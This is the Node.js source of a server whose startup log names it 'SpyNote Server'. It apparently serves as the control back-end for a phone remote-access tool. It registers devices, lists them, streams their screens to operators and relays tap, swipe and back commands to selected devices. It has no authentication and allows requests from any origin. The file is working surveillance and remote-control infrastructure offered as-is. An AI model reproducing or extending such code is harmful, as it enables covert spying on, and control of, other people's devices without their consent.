const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json());

// Store connected devices
const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;

    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status });
        console.log("Device registered:", deviceId);
    }

    res.json({ success: true });
});


app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('New connection:', socket.id);

    socket.on('disconnect', () => {
        console.log('Disconnected:', socket.id);
    });
});

// Device connections
io.on('connection', (socket) => {
    socket.on('screen-frame', (data) => {
        const { deviceId, width, height, data: frameData } = data;
        socket.to(deviceId).emit('screen-update', data);
    });
});

// Control handlers
io.on('connection', (socket) => {
    // Select device
    socket.on('select-device', (deviceId) => {
        socket.join(deviceId);
        socket.emit('device-selected', deviceId);
    });

    // Touch controls
    socket.on('tap', (data) => {
        const { deviceId, x, y } = data;
        io.to(deviceId).emit('control', {
            action: 'tap',
            x: x * 1080/400, // Scale to device resolution
            y: y * 1920/800
        });
    });

    socket.on('swipe', (data) => {
        const { deviceId, startX, startY, endX, endY } = data;
        io.to(deviceId).emit('control', {
            action: 'swipe',
            startX: startX * 1080/400,
            startY: startY * 1920/800,
            endX: endX * 1080/400,
            endY: endY * 1920/800
        });
    });

    socket.on('back', (data) => {
        const { deviceId } = data;
        io.to(deviceId).emit('control', { action: 'back' });
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`SpyNote Server running on port ${PORT}`);
});
